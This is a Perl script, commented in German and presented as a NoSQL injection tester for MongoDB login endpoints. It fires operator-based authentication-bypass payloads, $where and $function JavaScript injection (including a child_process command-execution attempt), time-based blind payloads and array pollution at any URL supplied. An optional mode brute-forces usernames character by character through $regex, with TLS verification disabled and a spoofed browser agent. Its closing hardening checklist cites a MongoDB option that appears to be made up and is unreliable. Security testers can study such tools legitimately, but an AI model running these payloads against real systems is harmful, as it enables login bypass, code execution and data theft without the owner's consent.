#!/usr/bin/perl
use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Cookies;
use Getopt::Long;
use URI::Escape;
use JSON;
use Time::HiRes qw(time);
use MIME::Base64;

# ======================================================================
# NOSQL INJECTION TESTER (MongoDB Focus)
# ======================================================================
# Autor:  Klaus Baumdick (stoerti) aka "The jobless hacker"
# Zweck:  Testet Webapplikationen auf NoSQL Injection Schwachstellen
# Version: 1.0
# Lizenz: CC BY-NC-ND 4.0
# ======================================================================
# Testet:
#   • MongoDB Operator Injection ($ne, $gt, $lt, $in, $nin)
#   • JavaScript Injection ($where, $function)
#   • Blind NoSQL Injection (zeitbasiert, boolean-based)
#   • JSON Injection (Content-Type Manipulation)
#   • Array Injection (Parameter Pollution)
#   • Data Extraction via Comparison Operators
# ======================================================================

my $verbose = 0;
my $output_file = "";
my $target_url = "";
my $username_param = "username";
my $password_param = "password";
my $test_user = "admin";
my $request_type = "POST";
my $content_type = "json"; # json, form, xml
my $blind_delay = 2;
my $timeout = 10;
my $extract_data = 0;

GetOptions(
    "verbose|v" => \$verbose,
    "output|o=s" => \$output_file,
    "url=s" => \$target_url,
    "username-param=s" => \$username_param,
    "password-param=s" => \$password_param,
    "user=s" => \$test_user,
    "method=s" => \$request_type,
    "content-type=s" => \$content_type,
    "blind-delay=i" => \$blind_delay,
    "timeout=i" => \$timeout,
    "extract" => \$extract_data,
    "help|h" => sub { print_help(); exit 0; }
);

if (!$target_url) {
    print "Fehler: Target-URL ist erforderlich!\n";
    print_help();
    exit 1;
}

print "╔════════════════════════════════════════════════════════════╗\n";
print "║                  NOSQL INJECTION TESTER                    ║\n";
print "║                    Version 1.0 (MongoDB)                   ║\n";
print "╚════════════════════════════════════════════════════════════╝\n\n";

print "[INFO] Ziel: $target_url\n";
print "[INFO] Content-Type: $content_type\n";
print "[INFO] Username-Parameter: $username_param\n";
print "[INFO] Password-Parameter: $password_param\n";
print "[INFO] Test-User: $test_user\n\n";

my %results = (
    operator_injection => [],
    js_injection => [],
    blind_injection => [],
    array_injection => [],
    data_extraction => [],
    recommendations => []
);

my $ua = LWP::UserAgent->new(
    ssl_opts => { verify_hostname => 0 },
    agent => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    timeout => $timeout,
    max_redirect => 0,
    cookie_jar => {}
);

# ======================================================================
# TEST 1: BASELINE - NORMALER LOGIN
# ======================================================================
print "[TEST 1] Baseline - Normaler Login-Versuch\n";
print "-" x 50, "\n";

my $baseline_response = send_nosql_login($test_user, "wrongpassword");
my $baseline_content = $baseline_response ? $baseline_response->decoded_content : "";
my $baseline_time = measure_login_time($test_user, "wrongpassword");
my $baseline_success = $baseline_response && $baseline_response->is_success ? 1 : 0;

print "  Normaler Response: " . ($baseline_response ? $baseline_response->code : "keine Response") . "\n";
print "  Response-Zeit: ${baseline_time}ms\n";
print "  Erfolg: " . ($baseline_success ? "JA" : "NEIN") . "\n\n";

# ======================================================================
# TEST 2: MONGODB OPERATOR INJECTION
# ======================================================================
print "[TEST 2] MongoDB Operator Injection\n";
print "-" x 50, "\n";

my @operator_payloads = (
    # $ne (not equal) Bypass
    { name => "ne_bypass_1", user => { '$ne' => '' }, pass => { '$ne' => '' }, desc => '$ne Bypass' },
    { name => "ne_bypass_2", user => { '$ne' => 1 }, pass => { '$ne' => 1 }, desc => '$ne mit Zahl' },
    { name => "ne_bypass_3", user => { '$ne' => 'admin' }, pass => { '$ne' => '' }, desc => '$ne mit String' },
    { name => "ne_bypass_4", user => { '$ne' => 'admin' }, pass => { '$ne' => 'wrong' }, desc => 'Spezifischer $ne' },

    # $gt (greater than) Bypass
    { name => "gt_bypass_1", user => { '$gt' => '' }, pass => { '$gt' => '' }, desc => '$gt Bypass' },
    { name => "gt_bypass_2", user => { '$gt' => 'a' }, pass => { '$gt' => 'a' }, desc => '$gt mit Buchstabe' },
    { name => "gt_bypass_3", user => { '$gt' => 'admin' }, pass => { '$gt' => '' }, desc => '$gt Admin' },

    # $lt (less than) Bypass
    { name => "lt_bypass_1", user => { '$lt' => 'zzz' }, pass => { '$lt' => 'zzz' }, desc => '$lt Bypass' },

    # $gte/$lte
    { name => "gte_bypass", user => { '$gte' => '' }, pass => { '$gte' => '' }, desc => '$gte Bypass' },
    { name => "lte_bypass", user => { '$lte' => 'zzz' }, pass => { '$lte' => 'zzz' }, desc => '$lte Bypass' },

    # $in (in array) Bypass
    { name => "in_bypass_1", user => { '$in' => ['admin', 'root', 'user'] }, pass => { '$in' => ['password', ''] }, desc => '$in Bypass' },
    { name => "in_bypass_2", user => { '$in' => [1,2,3,4] }, pass => { '$in' => ['a','b','c'] }, desc => '$in mit Zahlen' },

    # $nin (not in) Bypass
    { name => "nin_bypass", user => { '$nin' => ['invalid'] }, pass => { '$nin' => ['wrong'] }, desc => '$nin Bypass' },

    # $exists
    { name => "exists_bypass", user => { '$exists' => 1 }, pass => { '$exists' => 1 }, desc => '$exists Bypass' },
    { name => "exists_not", user => { '$exists' => 0 }, pass => { '$exists' => 0 }, desc => '$exists:0 Bypass' },

    # $type
    { name => "type_bypass", user => { '$type' => 2 }, pass => { '$type' => 2 }, desc => '$type String Bypass' },

    # $regex
    { name => "regex_bypass_1", user => { '$regex' => '^a.*' }, pass => { '$regex' => '^p.*' }, desc => '$regex Bypass' },
    { name => "regex_bypass_2", user => { '$regex' => 'admin' }, pass => { '$regex' => '.*' }, desc => '$regex Wildcard' },

    # Kombinierte Operatoren
    { name => "combined_and", user => { '$and' => [ { '$ne' => '' }, { '$exists' => 1 } ] }, pass => { '$ne' => '' }, desc => '$and Kombination' },
    { name => "combined_or", user => { '$or' => [ { '$ne' => '' }, { '$eq' => 'admin' } ] }, pass => { '$ne' => '' }, desc => '$or Kombination' },
    { name => "combined_not", user => { '$not' => { '$eq' => 'invalid' } }, pass => { '$ne' => '' }, desc => '$not Operator' },

    # $where (JavaScript) - später separat
);

print "  Teste " . scalar(@operator_payloads) . " Operator Payloads...\n\n";

foreach my $payload (@operator_payloads) {
    print "  Payload: $payload->{name} - $payload->{desc}\n" if $verbose;

    my $response = send_nosql_login($payload->{user}, $payload->{pass});
    my $time = measure_login_time($payload->{user}, $payload->{pass});

    my $result = {
        type => "operator",
        payload => $payload->{name},
        user => $payload->{user},
        pass => $payload->{pass},
        status => $response ? $response->code : 0,
        time => $time,
        success => $response && $response->is_success ? 1 : 0,
    };

    if ($response && $response->is_success && !$baseline_success) {
        print "    ✅ INJECTION ERFOLGREICH! Login mit " . json_encode($payload->{user}) . "\n";
        $result->{injection_success} = 1;
        push @{$results{operator_injection}}, $result;
        push @{$results{recommendations}}, "NoSQL Operator Injection möglich - Input validieren";
    } else {
        print "    Kein Erfolg\n" if $verbose > 1;
    }

    select(undef, undef, undef, 0.1);
}

# ======================================================================
# TEST 3: JAVASCRIPT INJECTION ($where, $function)
# ======================================================================
print "\n[TEST 3] JavaScript Injection\n";
print "-" x 50, "\n";

my @js_payloads = (
    # $where Injection
    { name => "where_true", user => { '$where' => 'function() { return true; }' }, pass => "x", desc => '$where true' },
    { name => "where_false", user => { '$where' => 'function() { return false; }' }, pass => "x", desc => '$where false' },
    { name => "where_admin", user => { '$where' => 'this.username == "admin"' }, pass => "x", desc => '$where admin check' },
    { name => "where_sleep", user => { '$where' => 'function() { sleep(5000); return true; }' }, pass => "x", desc => '$where time-based' },

    # $function (MongoDB 4.4+)
    { name => "function_true", user => { '$function' => { 'body' => 'return true', 'args' => [] } }, pass => "x", desc => '$function true' },
    { name => "function_sleep", user => { '$function' => { 'body' => 'sleep(5000); return true', 'args' => [] } }, pass => "x", desc => '$function sleep' },

    # mapReduce Injection
    { name => "map_reduce", user => { 'map' => 'function() { emit(this.username, 1); }' }, pass => "x", desc => 'mapReduce' },

    # JavaScript in Strings
    { name => "js_string", user => { 'username' => { '$regex' => '^.*$/; return true; //' } }, pass => "x", desc => 'JS in regex' },

    # Command Execution (theoretisch)
    { name => "cmd_exec", user => { '$where' => 'function() { require("child_process").exec("id", function(){}); return true; }' }, pass => "x", desc => 'Command exec' },
);

print "  Teste " . scalar(@js_payloads) . " JavaScript Payloads...\n\n";

foreach my $payload (@js_payloads) {
    print "  Payload: $payload->{name} - $payload->{desc}\n" if $verbose;

    my $start = time();
    my $response = send_nosql_login($payload->{user}, $payload->{pass});
    my $duration = (time() - $start) * 1000;

    my $result = {
        type => "javascript",
        payload => $payload->{name},
        user => $payload->{user},
        status => $response ? $response->code : 0,
        duration => $duration,
        success => $response && $response->is_success ? 1 : 0,
    };

    # Zeitbasierte Erkennung
    if ($duration > 5000 && $payload->{name} =~ /sleep/) {
        print "    ⏰ JAVASCRIPT INJECTION! Dauer: ${duration}ms\n";
        $result->{js_execution} = 1;
        push @{$results{js_injection}}, $result;
        push @{$results{recommendations}}, "JavaScript Injection möglich - \$where/\$function deaktivieren";
    }

    select(undef, undef, undef, 0.2);
}

# ======================================================================
# TEST 4: BLIND NOSQL INJECTION
# ======================================================================
print "\n[TEST 4] Blind NoSQL Injection\n";
print "-" x 50, "\n";

my @blind_payloads = (
    # Boolean-based Blind
    { name => "blind_bool_true", user => { '$eq' => 'admin' }, pass => { '$ne' => '' }, desc => 'Boolean True Test' },
    { name => "blind_bool_false", user => { '$eq' => 'nonexistent' }, pass => { '$ne' => '' }, desc => 'Boolean False Test' },

    # Time-based Blind
    { name => "blind_time_sleep", user => { '$where' => 'function() { var d = new Date(); while(new Date() - d < 5000){}; return true; }' }, pass => "x", desc => 'Time-based Sleep' },
    { name => "blind_time_loop", user => { '$where' => 'function() { for(i=0;i<10000000;i++); return true; }' }, pass => "x", desc => 'Time-based Loop' },

    # Extraction via $regex
    { name => "regex_extract_a", user => { '$regex' => '^a.*' }, pass => { '$ne' => '' }, desc => 'Regex Extraction (a*)' },
    { name => "regex_extract_ad", user => { '$regex' => '^ad.*' }, pass => { '$ne' => '' }, desc => 'Regex Extraction (ad*)' },
    { name => "regex_extract_adm", user => { '$regex' => '^adm.*' }, pass => { '$ne' => '' }, desc => 'Regex Extraction (adm*)' },
    { name => "regex_extract_admi", user => { '$regex' => '^admi.*' }, pass => { '$ne' => '' }, desc => 'Regex Extraction (admi*)' },
    { name => "regex_extract_admin", user => { '$regex' => '^admin.*' }, pass => { '$ne' => '' }, desc => 'Regex Extraction (admin*)' },

    # $gt/$lt Extraction
    { name => "gt_extract", user => { '$gt' => 'a' }, pass => { '$ne' => '' }, desc => '$gt Extraction' },
    { name => "lt_extract", user => { '$lt' => 'z' }, pass => { '$ne' => '' }, desc => '$lt Extraction' },
);

print "  Teste " . scalar(@blind_payloads) . " Blind Payloads...\n\n";

my %response_times;

foreach my $payload (@blind_payloads) {
    print "  Payload: $payload->{name} - $payload->{desc}\n" if $verbose;

    my $start = time();
    my $response = send_nosql_login($payload->{user}, $payload->{pass});
    my $duration = (time() - $start) * 1000;

    $response_times{$payload->{name}} = $duration;

    my $result = {
        type => "blind",
        payload => $payload->{name},
        user => $payload->{user},
        duration => $duration,
        status => $response ? $response->code : 0,
        success => $response && $response->is_success ? 1 : 0,
    };

    # Zeitbasierte Erkennung
    if ($duration > $baseline_time * 3 && $duration > 2000) {
        print "    ⏰ BLIND INJECTION! Dauer: ${duration}ms\n";
        $result->{blind_detected} = 1;
        push @{$results{blind_injection}}, $result;
    }

    select(undef, undef, undef, 0.5);
}

# ======================================================================
# TEST 5: ARRAY INJECTION (Parameter Pollution)
# ======================================================================
print "\n[TEST 5] Array Injection / Parameter Pollution\n";
print "-" x 50, "\n";

my @array_payloads = (
    # Mehrfache Parameter
    { name => "array_dup", user => ["admin", "root"], pass => ["password", "admin"], desc => 'Duplicate Parameter' },
    { name => "array_ne", user => ["admin", { '$ne' => '' }], pass => ["x", { '$ne' => '' }], desc => 'Array mit $ne' },
    { name => "array_mixed", user => ["admin", { '$gt' => '' }], pass => ["pass", { '$gt' => '' }], desc => 'Array gemischt' },

    # JSON in Array
    { name => "json_array", user => '[{"$ne": ""}]', pass => '[{"$ne": ""}]', desc => 'JSON Array String' },
);

foreach my $payload (@array_payloads) {
    print "  Payload: $payload->{name} - $payload->{desc}\n" if $verbose;

    my $response = send_nosql_login($payload->{user}, $payload->{pass});

    if ($response && $response->is_success && !$baseline_success) {
        print "    ✅ ARRAY INJECTION ERFOLGREICH!\n";
        push @{$results{array_injection}}, { name => $payload->{name}, success => 1 };
    }
}

# ======================================================================
# TEST 6: DATA EXTRACTION (falls --extract gesetzt)
# ======================================================================
if ($extract_data && @{$results{blind_injection}}) {
    print "\n[TEST 6] Data Extraction via Blind Injection\n";
    print "-" x 50, "\n";

    print "  Versuche Benutzernamen zu extrahieren...\n";

    my @chars = ('a'..'z', 'A'..'Z', '0'..'9', '-', '_', '.', '@');
    my $found = "";

    for my $pos (1..10) {  # Maximal 10 Zeichen
        my $found_char = "";

        foreach my $char (@chars) {
            my $test = $found . $char;
            my $payload = {
                'username' => { '$regex' => '^' . $test . '.*' }
            };

            my $start = time();
            my $response = send_nosql_login($payload, { '$ne' => '' });
            my $duration = (time() - $start) * 1000;

            # Wenn Response schneller/anders, könnte Zeichen korrekt sein
            if ($response && $response->is_success) {
                print "    Teste: $test -> OK\n" if $verbose;
                $found_char = $char;
                last;
            }

            select(undef, undef, undef, 0.1);
        }

        if ($found_char) {
            $found .= $found_char;
            print "  Bisher: $found\n";
        } else {
            last;
        }
    }

    if ($found) {
        print "  ✅ EXTRAHIERT: $found\n";
        push @{$results{data_extraction}}, { extracted => $found };
    }
}

# ======================================================================
# AUSWERTUNG
# ======================================================================
print "\n" . "=" x 60 . "\n";
print "ERGEBNIS-ZUSAMMENFASSUNG\n";
print "=" x 60 . "\n\n";

print "OPERATOR INJECTION: ";
if (@{$results{operator_injection}}) {
    print "❌ GEFÄHRDET (" . scalar(@{$results{operator_injection}}) . " Payloads erfolgreich)\n";
} else {
    print "✅ SICHER\n";
}

print "JAVASCRIPT INJECTION: ";
if (@{$results{js_injection}}) {
    print "❌ MÖGLICH (" . scalar(@{$results{js_injection}}) . ")\n";
} else {
    print "✅ KEINE\n";
}

print "BLIND INJECTION: ";
if (@{$results{blind_injection}}) {
    print "⚠️  MÖGLICH (" . scalar(@{$results{blind_injection}}) . " Anomalien)\n";
} else {
    print "✅ KEINE\n";
}

print "ARRAY INJECTION: ";
if (@{$results{array_injection}}) {
    print "⚠️  MÖGLICH\n";
} else {
    print "✅ KEINE\n";
}

print "\nSCHWACHSTELLEN:\n";
if (@{$results{operator_injection}}) {
    print "  • KRITISCH: NoSQL Operator Injection - Authentifizierung umgehbar!\n";
    foreach my $v (@{$results{operator_injection}}[0..2]) {
        print "    - Payload: " . json_encode($v->{user}) . "\n";
    }
}

if (@{$results{js_injection}}) {
    print "  • KRITISCH: JavaScript Injection - Code-Ausführung möglich!\n";
}

if (@{$results{blind_injection}}) {
    print "  • MITTEL: Blind NoSQL Injection - Daten können extrahiert werden\n";
    if ($extract_data && @{$results{data_extraction}}) {
        print "    - Extrahierte Daten: $results{data_extraction}[0]{extracted}\n";
    }
}

print "\nEMPFEHLUNGEN:\n";
my %unique_recs;
foreach my $rec (@{$results{recommendations}}) {
    $unique_recs{$rec} = 1;
}

foreach my $rec (keys %unique_recs) {
    print "  • $rec\n";
}

print "\nNOSQL SICHERHEITS-CHECKLISTE:\n";
print "  • [ ] Input validieren und typ-checken (keine direkten JSON-Objekte)\n";
print "  • [ ] Operator Injection verhindern (\$ne, \$gt, \$where filtern)\n";
print "  • [ ] JavaScript-Ausführung deaktivieren (\$where, \$function)\n";
print "  • [ ] Parameter als Strings behandeln, nicht als Objekte\n";
print "  • [ ] Object-Diffing verwenden (unerwartete Felder ablehnen)\n";
print "  • [ ] MongoDB in --nounknownOperator Option nutzen\n";

# Report speichern
if ($output_file) {
    save_report();
    print "\nReport gespeichert in: $output_file\n";
}

# ======================================================================
# HILFSFUNKTIONEN
# ======================================================================

sub send_nosql_login {
    my ($user, $pass) = @_;

    my $request;
    my $content;

    if ($content_type eq "json") {
        $request = HTTP::Request->new($request_type, $target_url);
        $request->content_type('application/json');

        # Für JSON: Direkt als Hash/Array strukturieren
        my %data;

        if (ref($user) eq 'HASH' || ref($user) eq 'ARRAY') {
            $data{$username_param} = $user;
        } else {
            $data{$username_param} = $user;
        }

        if (ref($pass) eq 'HASH' || ref($pass) eq 'ARRAY') {
            $data{$password_param} = $pass;
        } else {
            $data{$password_param} = $pass;
        }

        $content = encode_json(\%data);
        $request->content($content);

    } elsif ($content_type eq "form") {
        $request = HTTP::Request->new($request_type, $target_url);
        $request->content_type('application/x-www-form-urlencoded');

        # Für Form: JSON als String kodieren
        my $user_str = ref($user) ? encode_json($user) : $user;
        my $pass_str = ref($pass) ? encode_json($pass) : $pass;

        $content = "$username_param=" . uri_escape($user_str) . "&$password_param=" . uri_escape($pass_str);
        $request->content($content);
    }

    if ($verbose > 1) {
        print "    Request: $content\n";
    }

    return $ua->request($request);
}

sub measure_login_time {
    my ($user, $pass) = @_;

    my $start = time();
    my $response = send_nosql_login($user, $pass);
    my $end = time();

    return ($end - $start) * 1000;
}

sub json_encode {
    my $data = shift;

    if (ref($data) eq 'HASH' || ref($data) eq 'ARRAY') {
        return encode_json($data);
    } else {
        return "$data";
    }
}

sub save_report {
    open(my $fh, '>', $output_file) or die "Kann Datei nicht erstellen: $!";

    print $fh "NOSQL INJECTION TEST REPORT\n";
    print $fh "===========================\n\n";
    print $fh "Getestet am: " . localtime() . "\n";
    print $fh "Target: $target_url\n";
    print $fh "Content-Type: $content_type\n\n";

    print $fh "ERGEBNISSE:\n";
    print $fh "-----------\n\n";

    print $fh "Operator Injection: " . scalar(@{$results{operator_injection}}) . " erfolgreich\n";
    print $fh "JS Injection: " . scalar(@{$results{js_injection}}) . "\n";
    print $fh "Blind Injection: " . scalar(@{$results{blind_injection}}) . " Anomalien\n";
    print $fh "Array Injection: " . scalar(@{$results{array_injection}}) . "\n\n";

    print $fh "GEFUNDENE PAYLOADS:\n";
    foreach my $v (@{$results{operator_injection}}) {
        print $fh "  • " . json_encode($v->{user}) . "\n";
    }

    print $fh "\nEMPFEHLUNGEN:\n";
    my %seen;
    foreach my $rec (@{$results{recommendations}}) {
        print $fh "  • $rec\n" unless $seen{$rec}++;
    }

    close $fh;
}

sub print_help {
    print <<'HELP';

NOSQL INJECTION TESTER (MongoDB)
================================

USAGE:
  perl nosql_injection_tester.pl --url URL [OPTIONEN]

ERFORDERLICH:
  --url URL         Login-URL oder API-Endpunkt

OPTIONEN:
  --username-param NAME   Parameter für Username (default: "username")
  --password-param NAME   Parameter für Passwort (default: "password")
  --user USER             Test-Benutzername (default: "admin")
  --method METHOD         HTTP-Methode: POST, GET (default: POST)
  --content-type TYPE     Content-Type: json, form (default: json)
  --blind-delay SECONDS   Verzögerung für Blind Tests (default: 2)
  --timeout SECONDS       Timeout für Requests (default: 10)
  --extract               Versuche Daten zu extrahieren (bei Blind Injection)
  -v, --verbose           Ausführliche Ausgabe
  -o, --output FILE       Report in Datei speichern
  -h, --help              Diese Hilfe anzeigen

BEISPIELE:
  # JSON-API testen
  perl nosql_injection_tester.pl --url https://api.example.com/login --content-type json

  # Form-Login testen
  perl nosql_injection_tester.pl --url https://example.com/login --content-type form

  # Mit Data Extraction
  perl nosql_injection_tester.pl --url https://example.com/api --extract -v -o report.txt

MONGODB OPERATOR PAYLOADS:
  • $ne:  {"username": {"$ne": ""}, "password": {"$ne": ""}}
  • $gt:  {"username": {"$gt": ""}, "password": {"$gt": ""}}
  • $in:  {"username": {"$in": ["admin", "root"]}}
  • $regex: {"username": {"$regex": "^admin.*"}}
  • $where: {"$where": "function() { return true; }"}

JAVASCRIPT INJECTION:
  • $where mit sleep:  {"$where": "function() { sleep(5000); return true; }"}
  • $function: {"$function": {"body": "return true", "args": []}}

SCHUTZMASSNAHMEN:
  • Keine direkten JSON-Objekte akzeptieren
  • Unerwartete Felder ablehnen (Object-Diffing)
  • MongoDB mit --nounknownOperator starten
  • $where und $function deaktivieren
  • Input als Strings behandeln, nicht als Objekte
  • Striktes Schema validieren
HELP
}
